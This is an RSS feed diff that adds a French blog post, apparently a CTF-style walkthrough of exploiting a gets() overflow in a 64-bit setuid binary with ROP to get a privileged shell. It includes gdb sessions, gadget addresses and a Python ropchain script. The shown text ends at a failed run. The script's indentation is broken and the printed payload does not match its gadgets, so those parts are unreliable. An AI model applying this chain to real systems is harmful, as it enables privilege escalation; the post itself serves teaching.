@@ -2,20 +2,457 @@
 <rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
   <channel>
     <title>Security on ngup, stfu, rtfm &amp; KISS</title>
-    <link>https://unix4fun.github.io/tags/security/</link>
+    <link>http://github.unix4fun.io/tags/security/</link>
     <description>Recent content in Security on ngup, stfu, rtfm &amp; KISS</description>
     <generator>Hugo -- gohugo.io</generator>
     <language>en-us</language>
     <copyright>&amp;copy; unix4fun 2016.&lt;br&gt;All rights reserved.</copyright>
-    <lastBuildDate>Fri, 23 Sep 2016 07:38:13 +0200</lastBuildDate>
-    <atom:link href="https://unix4fun.github.io/tags/security/index.xml" rel="self" type="application/rss+xml" />
+    <lastBuildDate>Mon, 03 Oct 2016 10:48:10 +0200</lastBuildDate>
+    <atom:link href="http://github.unix4fun.io/tags/security/index.xml" rel="self" type="application/rss+xml" />
+    
+    <item>
+      <title>Exploiter un binaire 64 bits sous Linux via ROP</title>
+      <link>http://github.unix4fun.io/post/howto-rop-en-64bits/</link>
+      <pubDate>Mon, 03 Oct 2016 10:48:10 +0200</pubDate>
+      
+      <guid>http://github.unix4fun.io/post/howto-rop-en-64bits/</guid>
+      <description>
+
+&lt;h1 id=&#34;introduction&#34;&gt;Introduction&lt;/h1&gt;
+
+&lt;p&gt;Bon ben dans la même veine que le post précedent, je vais tâcher d&amp;rsquo;expliquer comment exploiter un buffer overflow sur la pile, en utilisant la méthode de Return-Oriented Programming.  Cette technique est utilise quand la pile n&amp;rsquo;est pas exécutable, l&amp;rsquo;idée étant de sauter dans une portion de code qui l&amp;rsquo;est, et petit à petit, reconstruire un flot d&amp;rsquo;exécution qui mène à&amp;hellip; obtenir un shell avec des droits plus importants, dans le cas présent.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;$ ll
+total 876
+drwxr-x---  2 user-cracked  user           4096 mai   25  2015 ./
+drwxr-xr-x 27 root          root           4096 sept. 26 20:01 ../
+-rwsr-x---  1 user-cracked  user         877214 mai   16  2015 prog*
+-rw-r-----  1 user-cracked  user            383 mai   24  2015 prog.c
+-r--------  1 user-cracked  user-cracked     23 juin   7  2015 .passwd
+$
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Comme auparavant, on a un binaire setuid user-cracked, et il nous faut lire le fichier &lt;code&gt;.passwd&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;Bon, essayons d&amp;rsquo;avoir quelques informations pertinentes&amp;hellip;&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;$ checksec.sh --file ./prog
+RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
+Partial RELRO   No canary found   NX enabled    No PIE          No RPATH   No RUNPATH   ./prog
+
+$ file prog
+prog: setuid ELF 64-bit LSB  executable, x86-64, version 1 (GNU/Linux), statically linked, for GNU/Linux 2.6.24, BuildID[sha1]=41592dcab5a8baf3af0ea207b149b6153ad1e6d1, not stripped
+
+$ cat prog.c
+#inclde &amp;lt;stdio.h&amp;gt;
+#include &amp;lt;string.h&amp;gt;
+
+/*
+gcc -o prog prog.c -fno-stack-protector  -Wl,-z,relro,-z,now,-z,noexecstack -static
+*/
+
+int main(int argc, char **argv)
+{
+
+    char buffer[256];
+    int len, i;
+
+    gets(buffer);
+    len = strlen(buffer);
+
+    printf(&amp;quot;Hex result: &amp;quot;);
+
+    for (i=0; i&amp;lt;len; i++) {
+        printf(&amp;quot;%02x&amp;quot;, buffer[i]);
+    }
+
+    printf(&amp;quot;\n&amp;quot;);
+    return 0;
+}
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Bon, il y a un buffer overflow évident à cause de &lt;code&gt;gets()&lt;/code&gt;.  Tout le monde sait qu&amp;rsquo;il ne faut pas utiliser cette fonction, pas la peine d&amp;rsquo;épiloguer.&lt;/p&gt;
+
+&lt;p&gt;Ici, il y a deux choses a avoir en tete:&lt;/p&gt;
+
+&lt;ul&gt;
+&lt;li&gt;la pile est non-executable&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;Ce qui fait qu&amp;rsquo;on ne pourra pas pousser un shellcode directement dans la pile, via un buffer à exploiter ou une variable d&amp;rsquo;environnement.  Il faudra faire du ret2libc, ou du ROP.&lt;/p&gt;
+
+&lt;ul&gt;
+&lt;li&gt;le programme tourne en 64 bits&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;Les conventions d&amp;rsquo;appel de fonction ne sont pas les mêmes qu&amp;rsquo;en 32 bits, les syscalls ont de petites différences, etc.  On verra ca dans la suite&amp;hellip;  Il faut également garder à l&amp;rsquo;esprit que l&amp;rsquo;espace des adresses valide n&amp;rsquo;est pas le même qu&amp;rsquo;en 32 bits.  En effet souvent on utilise la fameuse séquence &lt;code&gt;0x414141..&lt;/code&gt;. pour marquer qu&amp;rsquo;on contrôle bien le pointer &lt;code&gt;$eip&lt;/code&gt;.  En 32 bits, cette adresse est valide puisque l&amp;rsquo;espace adressable va de &lt;code&gt;0X0..0&lt;/code&gt; à &lt;code&gt;0xbfffffff&lt;/code&gt;.  Par contre en 64 bits, on va de &lt;code&gt;0x00...0&lt;/code&gt; à &lt;code&gt;0x0000b7ffffffffff&lt;/code&gt;.  Donc &lt;code&gt;0x4141...&lt;/code&gt; va directement taper dans les adresses interdites.  Si on forge une adresse bidon, il faut mettre les deux premiers bytes (au moins) à zéro.&lt;/p&gt;
+
+&lt;p&gt;Cherchons la présence de fonctions qui nous aideraient bien à avoir un shell&amp;hellip;&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;$ nm -a ./prog | egrep &#39;(system|exec)&#39;
+0000000000468420 T _dl_make_stack_executable
+00000000006c11a8 D _dl_make_stack_executable_hook
+000000000048ce60 t execute_cfa_program
+000000000048e200 t execute_stack_op
+00000000004aa1c0 r system_dirs
+00000000004aa1a0 r system_dirs_len
+$
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Oookay, rien d&amp;rsquo;intéressant.   Vraiment?&lt;/p&gt;
+
+&lt;h1 id=&#34;tentative-de-ret2libc&#34;&gt;Tentative de ret2libc&lt;/h1&gt;
+
+&lt;p&gt;Il y a peut-être moyen de rendre la stack exécutable grâce à &lt;code&gt;mprotect()&lt;/code&gt; (&lt;code&gt;_dl_make_stack_executable&lt;/code&gt; nous y a fait fortement penser), puis de sauter à l&amp;rsquo;adresse d&amp;rsquo;un shellcode qu&amp;rsquo;on aurait mis dans le buffer du programme, ou dans une variable d&amp;rsquo;environnement.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;$ nm prog| grep mprotect
+0000000000434e10 W mprotect
+0000000000434e10 T __mprotect
+$
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Ca semble jouable? Le man de &lt;code&gt;mprotect(2)&lt;/code&gt; nous dit qu&amp;rsquo;il faut PROT_EXEC pour rendre une portion de code exécutable (&lt;code&gt;0x4&lt;/code&gt; d&amp;rsquo;après les headers du système).  Dans le doute, si on peut faire appel à cette fonction, autant filer tous les flags de l&amp;rsquo;univers: &lt;code&gt;PROT_EXEC|PROT_WRITE|PROT_READ&lt;/code&gt; = &lt;code&gt;0x7&lt;/code&gt;.  Le prototype de la fonction est le suivant :&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;   int mprotect(void *addr, size_t len, int prot);
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Il faudra donc mettre dans l&amp;rsquo;ordre, sur la stack:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;[ 0x7 | stacksize | $esp | @__mprotect | return addr ]
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Euh&amp;hellip; en fait non.  En réalité sur 64 bits, le passage de paramètres d&amp;rsquo;une fonction se fait via les registres, pas en ajoutant sur la pile.  Donc l&amp;rsquo;appel sera de la forme :&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;[ @__mprotect | return addr ]
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Les params sont ensuite passés via les registres &lt;code&gt;$rdi&lt;/code&gt;, &lt;code&gt;$rsi&lt;/code&gt;, &lt;code&gt;$rdx&lt;/code&gt;, &lt;code&gt;$rcx&lt;/code&gt;, &lt;code&gt;$r8&lt;/code&gt;, et &lt;code&gt;$r9&lt;/code&gt;.  Si vraiment il faut encore passer plus de paramètres à la fonction, alors c&amp;rsquo;est mis sur la stack (mais ça reste rare).  Mais on ne devrait pas aller jusque la, puisque &lt;code&gt;mprotect()&lt;/code&gt; ne prend que 3 arguments.&lt;/p&gt;
+
+&lt;p&gt;Une fois la stack rendue exécutable, il suffira d&amp;rsquo;avoir empiler l&amp;rsquo;adresse de notre shellcode (&lt;code&gt;return addr&lt;/code&gt; dans le petit schéma) pour sauter où on souhaite.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;gdb$ ./prog
+[...]
+gdb$ disas main
+Dump of assembler code for function main:
+   0x000000000040105e &amp;lt;+0&amp;gt;:     push   rbp
+   0x000000000040105f &amp;lt;+1&amp;gt;:     mov    rbp,rsp
+   0x0000000000401062 &amp;lt;+4&amp;gt;:     sub    rsp,0x120
+   [...]
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;On voit que le système réserve &lt;code&gt;0x120&lt;/code&gt; (288) bytes dans la pile pour faire de la place aux variables locales, etc.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;   0x0000000000401076 &amp;lt;+24&amp;gt;:    lea    rax,[rbp-0x110]
+   0x000000000040107d &amp;lt;+31&amp;gt;:    mov    rdi,rax
+   0x0000000000401080 &amp;lt;+34&amp;gt;:    call   0x408750 &amp;lt;gets&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;A l&amp;rsquo;aide de ces trois instruction, on déduit que le registre rax contient l&amp;rsquo;adresse du buffer qui sera passé à la fonction &lt;code&gt;gets()&lt;/code&gt;.  Et que sa base est à &lt;code&gt;0x110&lt;/code&gt; (272) bytes du début de la pile (&lt;code&gt;$rbp&lt;/code&gt;).  On en déduit donc que si on écrit 272 bytes dans &lt;code&gt;buffer&lt;/code&gt;, alors on arrivera pile a la limite de &lt;code&gt;$rbp&lt;/code&gt; qui a été empilé.  Les 8 prochains bytes vont écraser $rbp, et les 8 suivant écraseront &lt;code&gt;$rip&lt;/code&gt;.  C&amp;rsquo;est ce registre qu&amp;rsquo;on veut contrôler.  On va tester (par acquis de conscience on met une adresse valide dans &lt;code&gt;$rbp&lt;/code&gt;, i.e. &lt;code&gt;0x0000424242424242&lt;/code&gt;, et &lt;code&gt;0x0000434343434343&lt;/code&gt; dans &lt;code&gt;$rip&lt;/code&gt;:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;gdb$ r &amp;lt; &amp;lt;(perl -e &#39;print &amp;quot;A&amp;quot;x272 . &amp;quot;B&amp;quot;x6 . &amp;quot;\x00\x00&amp;quot; . &amp;quot;C&amp;quot;x6 . &amp;quot;\x00\x00&amp;quot;&#39;)
+----------------------------------------------------------------------------------------------------------------------[regs]
+ RAX: 0x0000000000000000  RBX: 0x00000000004002B0  RBP: 0x0000424242424242  RSP: 0x000003D42322B720  o d I t s Z a P c
+ RDI: 0x0000000000000001  RSI: 0x00000000006C26C0  RDX: 0x000000000000000A  RCX: 0x0000000000434310  RIP: 0x0000434343434343
+ R8 : 0x000000000000000A  R9 : 0x0000000002296740  R10: 0x0000000000000022  R11: 0x0000000000000246  R12: 0x0000000000000000
+ R13: 0x0000000000401760  R14: 0x00000000004017F0  R15: 0x0000000000000000
+ CS: 0033  DS: 0000  ES: 0000  FS: 0063  GS: 0000  SS: 002B                            Error while running hook_stop:
+Cannot access memory at address 0x434343434343
+0x0000434343434343 in ?? ()
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Youpi les knackis!  Donc on a réussi à écrire dans &lt;code&gt;$rip&lt;/code&gt;. On met l&amp;rsquo;adresse de &lt;code&gt;mprotect()&lt;/code&gt; dans &lt;code&gt;$rip&lt;/code&gt;, on met un breakpoint sur l&amp;rsquo;instruction &lt;code&gt;ret&lt;/code&gt;.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;   [...]
+   0x00000000004010e6 &amp;lt;+136&amp;gt;:   mov    eax,0x0
+   0x00000000004010eb &amp;lt;+141&amp;gt;:   leave
+   0x00000000004010ec &amp;lt;+142&amp;gt;:   ret
+End of assembler dump.
+
+gdb$ b *0x00000000004010ec
+Breakpoint 1 at 0x4010ec
+
+gdb$ r &amp;lt; &amp;lt;(perl -e &#39;print &amp;quot;A&amp;quot;x272 . &amp;quot;B&amp;quot;x6 . &amp;quot;\x00\x00&amp;quot; . &amp;quot;\x10\x4e\x43&amp;quot;&#39;)
+[...]
+=&amp;gt; 0x4010ec &amp;lt;main+142&amp;gt;: ret
+[...]
+Breakpoint 1, 0x00000000004010ec in main ()
+gdb$ ni
+=&amp;gt; 0x434e10 &amp;lt;mprotect&amp;gt;: mov    eax,0xa
+   0x434e15 &amp;lt;mprotect+5&amp;gt;:       syscall
+   0x434e17 &amp;lt;mprotect+7&amp;gt;:       cmp    rax,0xfffffffffffff001
+   0x434e1d &amp;lt;mprotect+13&amp;gt;:      jae    0x438950 &amp;lt;__syscall_error&amp;gt;
+   0x434e23 &amp;lt;mprotect+19&amp;gt;:      ret
+   0x434e24:    nop    WORD PTR cs:[rax+rax*1+0x0]
+   0x434e2e:    xchg   ax,ax
+   0x434e30 &amp;lt;madvise&amp;gt;:  mov    eax,0x1c
+-----------------------------------------------------------------------------------------------------------------------------
+0x0000000000434e10 in mprotect ()
+
+
+Bien!  Est-ce qu&#39;on peut mettre les arguments voulus dans les registres idoines, maintenant?  Je ne vois pas comment faire, arrivé à ce stade.  C&#39;est malin, j&#39;aurais dû y penser plus tôt.  Ca a l&#39;air compromis, de ne faire que du ret2libc.  Va falloir passer par du ROP.
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h1 id=&#34;bon-ben-rop&#34;&gt;Bon&amp;hellip; ben ROP.&lt;/h1&gt;
+
+&lt;p&gt;L&amp;rsquo;objectif est de trouver des séquences d&amp;rsquo;instructions dans la zone exécutable de la mémoire du processus, afin de les emboîter petit à petit pour arriver à une succession d&amp;rsquo;opérations qui feront quelque chose de particulier.  En l&amp;rsquo;occurrence, obtenir un shell avec les droits privilégiés.&lt;/p&gt;
+
+&lt;p&gt;Récuperons un outil pour trouver des gadgets (c&amp;rsquo;est ainsi qu&amp;rsquo;on appelle ces séquences d&amp;rsquo;instructions).  Comme on n&amp;rsquo;a pas les droits en écriture dans le répertoire &lt;code&gt;$HOME&lt;/code&gt;, on va tout mettre en bordel dans &lt;code&gt;/tmp&lt;/code&gt;.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;$ mkdir /tmp/p
+$ wget https://github.com/downloads/0vercl0k/rp/rp-lin-x64 -O /tmp/p/
+$ chmod +x /tmp/p/rp-lin-x64
+$ export PATH=$PATH:/tmp/p
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;On va tenter de faire exécuter un &lt;code&gt;execve()&lt;/code&gt; via des gadgets, du coup.  Ce qu&amp;rsquo;on souhaite, c&amp;rsquo;est faire executer &lt;code&gt;execve(&amp;quot;/bin/sh&amp;quot;, NULL, NULL);&lt;/code&gt;.  Notons que d&amp;rsquo;après la documentation de l&amp;rsquo;ABI du système, &lt;code&gt;$rax&lt;/code&gt; doit contenir le numéro du syscall (et le contenu sera écrasé lors du retour de fonction, si jamais il se produit&amp;hellip; dans notre cas on s&amp;rsquo;en moque, puisqu&amp;rsquo;on veut spawner un shell).  Il faudra donc mettre les registres dans l&amp;rsquo;état suivant:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt; RAX &amp;lt;- 59 (la valeur du syscall execve() sur 64bits, avant int 0x80)
+ RDI &amp;lt;- &amp;quot;/bin/sh&amp;quot; ou quelque chose du genre
+ RSX &amp;lt;- 0 (NULL)
+ RDX &amp;lt;- 0 (NULL)
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Donc, le layout de la pile devrait ressembler à quelque chose comme ceci:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;[AAA....A] [BBBBBB00] [pop rax] [valeur à mettre dans rax] [pop rdi] [valeur à mettre dans rdi]... [appel à execve()]
+^      ^          ^
+|      |          |
+buffer     $rbp       $rip
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;On va utiliser l&amp;rsquo;outil téléchargé (il y en a d&amp;rsquo;autres, comme &lt;code&gt;ROPgadget&lt;/code&gt;), pour avoir les adresses des instructions intéressantes:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;$ rp-lin-x64 --file ./prog --unique -r 1 | grep &amp;quot;pop rax&amp;quot;
+[...]
+0x0044d2b4: pop rax ; ret  ;  (8 found)
+
+$ rp-lin-x64 --file ./prog --unique -r 1 | grep &amp;quot;pop rdi&amp;quot;
+[...]
+0x004016d3: pop rdi ; ret  ;  (163 found)
+
+$ rp-lin-x64 -f prog --unique  -r 1 | grep &amp;quot;pop rsi&amp;quot;
+[...]
+0x004017e7: pop rsi ; ret  ;  (51 found)
+
+$ rp-lin-x64 -f prog --unique  -r 1 | egrep &amp;quot;pop rdx&amp;quot;
+[...]
+0x00437205: pop rdx ; ret  ;  (2 found)
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Et pour finir, on cherche l&amp;rsquo;appel à un syscall.  Notons encore une fois une difference entre x86 et x86-64: l&amp;rsquo;appel est &lt;code&gt;int 0x80&lt;/code&gt; sur 32 bits, alors qu&amp;rsquo;on utilise &lt;code&gt;syscall&lt;/code&gt; sur x86-64 (depend si on est sur intel ou amd)&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;$ rp-lin-x64 -f prog --unique -r 1 | grep syscall
+[...]
+0x00400488: syscall  ;  (95 found)
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Bien, on a l&amp;rsquo;adresse a empiler en dernier!&lt;/p&gt;
+
+&lt;p&gt;Maintenant, si vous avez fait attention, vous avez remarqué qu&amp;rsquo;on a zappé quelque chose!  On doit resoudre le probleme de la chaîne de caractères censée être utilisée par execve().  On ne trouve pas &amp;ldquo;/bin/sh&amp;rdquo; dans l&amp;rsquo;image du programme en mémoire.  On va utiliser un trick:  trouver une petite chaîne dispo en mémoire, qui ne corresponde pas a une commande déjà existante, puis créer un wrapper à &lt;code&gt;/bin/dash&lt;/code&gt; qui portera le nom de cette chaîne.  Ce wrapper sera mis dans le répertoire &lt;code&gt;/tmp/p&lt;/code&gt;, qu&amp;rsquo;on ajoutera au &lt;code&gt;PATH&lt;/code&gt;.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;$ readelf -x .rodata ./prog | less
+[...]
+  0x00493c00 42654000 00000000 68654000 00000000 Be@.....he@.....
+[...]
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;On trouve la séquence &lt;code&gt;42654000&lt;/code&gt;, qui correspond à &lt;code&gt;&amp;quot;Be@&amp;quot;&lt;/code&gt; terminée par un nul-byte.  Son adresse est &lt;code&gt;0x00493c00&lt;/code&gt;, et on l&amp;rsquo;utilisera dans &lt;code&gt;$rdi&lt;/code&gt;.  Ensuite, on crée un petit shell script dans &lt;code&gt;/tmp/p&lt;/code&gt;:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;$ cat &amp;gt; /tmp/p/Be@
+#!/bin/dash
+
+/bin/dash
+$ chmod +x /tmp/p/Be@
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Ainsi, si &lt;code&gt;execve()&lt;/code&gt; invoque la commande &lt;code&gt;Be@&lt;/code&gt;, elle sera dans notre &lt;code&gt;PATH&lt;/code&gt;, et nous donnera un shell.  Magique non?  Ca évite une fastitieuse reconstruction d&amp;rsquo;un path type &lt;code&gt;/bin/sh&lt;/code&gt; via des gadgets.&lt;/p&gt;
+
+&lt;p&gt;Boooon, que les choses sérieuses commencent!  On va construire notre ropchain maintenant, en prenant soin de respecter l&amp;rsquo;endianness:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;$ cat &amp;gt; /tmp/p/ropchain.py
+#!/usr/bin/env python3
+
+import sys
+import struct
+
+def main(argv):
+   if len(argv) &amp;lt; 2:
+    print(&amp;quot;Usage: %s &amp;lt;padding length&amp;gt;&amp;quot;, argv[0])
+    raise SystemExit(-1)
+
+    padding_len = int(argv[1])
+
+    gadgets = []
+    gadgets.append(struct.pack(&#39;&amp;lt;Q&#39;, 0x000000000044d2b4))  # pop rax; ret
+    gadgets.append(struct.pack(&#39;&amp;lt;Q&#39;, 0x000000000000003b))  # store 59 on the stack
+    gadgets.append(struct.pack(&#39;&amp;lt;Q&#39;, 0x00000000004016d3))  # pop rdi; ret
+    gadgets.append(struct.pack(&#39;&amp;lt;Q&#39;, 0x0000000000493c00))  # addr of &amp;quot;Be@&amp;quot; to put in rsi
+    gadgets.append(struct.pack(&#39;&amp;lt;Q&#39;, 0x00000000004017e7))  # pop rsi; ret
+    gadgets.append(struct.pack(&#39;&amp;lt;Q&#39;, 0x0000000000000000))  # NULL pointer for args
+    gadgets.append(struct.pack(&#39;&amp;lt;Q&#39;, 0x0000000000437205))  # pop rdx; ret
+    gadgets.append(struct.pack(&#39;&amp;lt;Q&#39;, 0x0000000000000000))  # NULL pointer for envs
+    gadgets.append(struct.pack(&#39;&amp;lt;Q&#39;, 0x0000000000400488))  # syscall
+
+    payload = b&#39;A&#39; * (padding_len - 8) + b&#39;B&#39; * 6 + b&#39;\x00\x00&#39; + b&#39;&#39;.join(gadgets)
+    print(payload)
+
+if __name__ == &amp;quot;__main__&amp;quot;:
+    main(sys.argv)
+^D
+
+$ sc=$(ropchain.py 280); export sc=${sc:2:-1}; echo $sc
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBB\x00\x00\x9f\xbdA\x00\x00\x00\x00\x00\x10\xaaE\x00\x00\x00\x00\x00\x10\xaaE\x00\x00\x00\x00\x00\x10\xaaE\x00\x00\x00\x00\x00\x10\xaaE\x00\x00\x00\x00\x00\x10\xaaE\x00\x00\x00\x00\x00\x10\xaaE\x00\x00\x00\x00\x00\x10\xaaE\x00\x00\x00\x00\x00\x10\xaaE\x00\x00\x00\x00\x00\x10\xaaE\x00\x00\x00\x00\x00\x10\xaaE\x00\x00\x00\x00\x00\x10\xaaE\x00\x00\x00\x00\x00\x10\xaaE\x00\x00\x00\x00\x00\x10\xaaE\x00\x00\x00\x00\x00\x10\xaaE\x00\x00\x00\x00\x00\x10\xaaE\x00\x00\x00\x00\x00\x10\xaaE\x00\x00\x00\x00\x00\x10\xaaE\x00\x00\x00\x00\x00\x10\xaaE\x00\x00\x00\x00\x00\x10\xaaE\x00\x00\x00\x00\x00\x10\xaaE\x00\x00\x00\x00\x00\x10\xaaE\x00\x00\x00\x00\x00\x10\xaaE\x00\x00\x00\x00\x00\x10\xaaE\x00\x00\x00\x00\x00\x10\xaaE\x00\x00\x00\x00\x00\x10\xaaE\x00\x00\x00\x00\x00\x10\xaaE\x00\x00\x00\x00\x00\x10\xaaE\x00\x00\x00\x00\x00\x10\xaaE\x00\x00\x00\x00\x00\x10\xaaE\x00\x00\x00\x00\x00\x10\xaaE\x00\x00\x00\x00\x00\x10\xaaE\x00\x00\x00\x00\x00\x10\xaaE\x00\x00\x00\x00\x00\x10\xaaE\x00\x00\x00\x00\x00\x10\xaaE\x00\x00\x00\x00\x00\x10\xaaE\x00\x00\x00\x00\x00\x10\xaaE\x00\x00\x00\x00\x00\x10\xaaE\x00\x00\x00\x00\x00\x10\xaaE\x00\x00\x00\x00\x00\x10\xaaE\x00\x00\x00\x00\x00\x10\xaaE\x00\x00\x00\x00\x00\x10\xaaE\x00\x00\x00\x00\x00\x10\xaaE\x00\x00\x00\x00\x00\x10\xaaE\x00\x00\x00\x00\x00\x10\xaaE\x00\x00\x00\x00\x00\x10\xaaE\x00\x00\x00\x00\x00\x10\xaaE\x00\x00\x00\x00\x00\x10\xaaE\x00\x00\x00\x00\x00\x10\xaaE\x00\x00\x00\x00\x00\x10\xaaE\x00\x00\x00\x00\x00\x10\xaaE\x00\x00\x00\x00\x00\x10\xaaE\x00\x00\x00\x00\x00\x10\xaaE\x00\x00\x00\x00\x00\x10\xaaE\x00\x00\x00\x00\x00\x10\xaaE\x00\x00\x00\x00\x00\x10\xaaE\x00\x00\x00\x00\x00\x10\xaaE\x00\x00\x00\x00\x00\x10\xaaE\x00\x00\x00\x00\x00\x10\xaaE\x00\x00\x00\x00\x00\x10\xaaE\x00\x00\x00\x00\x000\xec@\x00\x00\x00\x00\x00\x00&amp;lt;I\x00\x00\x00\x00\x00\xe7\x17@\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x05rC\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xa7\x81K\x00\x00\x00\x00\x00&amp;rsquo;\xe9J\x00\x00\x00\x00\x00&lt;/p&gt;
+
+&lt;p&gt;NOTE:  le &lt;code&gt;${sc:2:-1}&lt;/code&gt; permet de se débarrasser du &lt;code&gt;b&amp;quot;&lt;/code&gt; en début de chaîne et &lt;code&gt;&amp;quot;&lt;/code&gt; en fin de chaîne.  Il y a sûrement moyen de faire ça intelligemment mais je suis une bille en python, et j&amp;rsquo;avais pas de temps à perdre là-dessus!&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;$ gdb ./prog
+[...]
+gdb$ disas main
+   [...]
+   0x00000000004010e6 &amp;lt;+136&amp;gt;:   mov    eax,0x0
+   0x00000000004010eb &amp;lt;+141&amp;gt;:   leave
+   0x00000000004010ec &amp;lt;+142&amp;gt;:   ret
+End of assembler dump.
+
+gdb$ b *0x00000000004010ec
+Breakpoint 1 at 0x4010ec
+
+gdb$ r &amp;lt; &amp;lt;(perl -e &#39;print &amp;quot;&#39;$sc&#39;&amp;quot;&#39;)
+Starting program: /home/usr/prog &amp;lt; &amp;lt;(perl -e &#39;print &amp;quot;&#39;$sc&#39;&amp;quot;&#39;)
+[...]
+=&amp;gt; 0x4010ec &amp;lt;main+142&amp;gt;: ret
+   0x4010ed:    nop    DWORD PTR [rax]
+[...]
+Breakpoint 1, 0x00000000004010ec in main ()
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;On regarde l&amp;rsquo;état de la stack, et on observe qu&amp;rsquo;on a correctement empilé les adresses de nos petits gadgets:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;gdb$ x/20gx $rsp - 30
+0x3ac2bce0758:  0x4141414141414141      0x4141414141414141
+0x3ac2bce0768:  0x4141414141414141      0x4141414141414141
+0x3ac2bce0778:  0x0000011600000116      0x0000424242424242
+0x3ac2bce0788:  0x000000000044d2b4      0x000000000000003b
+0x3ac2bce0798:  0x00000000004016d3      0x0000000000493c00
+0x3ac2bce07a8:  0x00000000004017e7      0x0000000000000000
+0x3ac2bce07b8:  0x0000000000437205      0x0000000000000000
+0x3ac2bce07c8:  0x0000000000400488      0x0000000000401700
+0x3ac2bce07d8:  0x0000000000000000      0x38ae7d8e75b336fa
+0x3ac2bce07e8:  0x3ff62a925f9536fa      0x0000000000000000
+
+gdb$ x/i $rip
+=&amp;gt; 0x4010ec &amp;lt;main+142&amp;gt;: ret
+
+gdb$ x/i 0x000000000044d2b4
+   0x44d2b4 &amp;lt;__printf_fp+4676&amp;gt;: pop    rax
+
+gdb$ x/2i 0x000000000044d2b4
+   0x44d2b4 &amp;lt;__printf_fp+4676&amp;gt;: pop    rax
+   0x44d2b5 &amp;lt;__printf_fp+4677&amp;gt;: ret
+
+gdb$ x/2i 0x00000000004016d3
+   0x4016d3 &amp;lt;__libc_setup_tls+515&amp;gt;:     pop    rdi
+   0x4016d4 &amp;lt;__libc_setup_tls+516&amp;gt;:     ret
+
+gdb$ x/2i 0x00000000004017e7
+   0x4017e7 &amp;lt;__libc_csu_init+135&amp;gt;:      pop    rsi
+   0x4017e8 &amp;lt;__libc_csu_init+136&amp;gt;:      ret
+
+gdb$ x/2i 0x0000000000437205
+   0x437205 &amp;lt;__lll_lock_wait_private+37&amp;gt;:       pop    rdx
+   0x437206 &amp;lt;__lll_lock_wait_private+38&amp;gt;:       ret
+
+gdb$ x/i 0x0000000000400488
+   0x400488 &amp;lt;backtrace_and_maps+183&amp;gt;:   syscall
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Vérifions que la chaîne est celle attendue:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;gdb$ x/s 0x0000000000493c00
+0x493c00:       &amp;quot;Be@&amp;quot;
+gdb$ c
+Continuing.
+
+Program received signal SIGSEGV, Segmentation fault.
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Bizarre, si j&amp;rsquo;execute instruction par instruction on voit que tout se passe comme espère, mais on n&amp;rsquo;a pas de shell, et le programme explose.  D&amp;rsquo;ailleurs pour confirmer, on peut utiliser &lt;code&gt;strace(1)&lt;/code&gt;:&lt;/p&gt;
+
